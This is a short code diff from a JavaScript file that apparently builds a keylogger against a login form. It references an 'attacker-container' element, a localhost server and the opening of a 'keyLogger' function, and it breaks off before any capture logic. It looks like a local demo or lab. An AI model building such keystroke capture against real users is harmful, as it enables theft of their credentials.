@@ -3,10 +3,15 @@ const loginForm = document.getElementById("login");
 const attackerContainer = document.getElementById("attacker-container");
 const baseUrl = "http://localhost:3000";
 let times;
+
 const debounce = (func, time) => {
   clearTimeout(times);
   times = setTimeout(func, time);
 };
+
+
+// ../views/lockheed.html"
+
 
 const keyLogger = async (key) => {
   try {
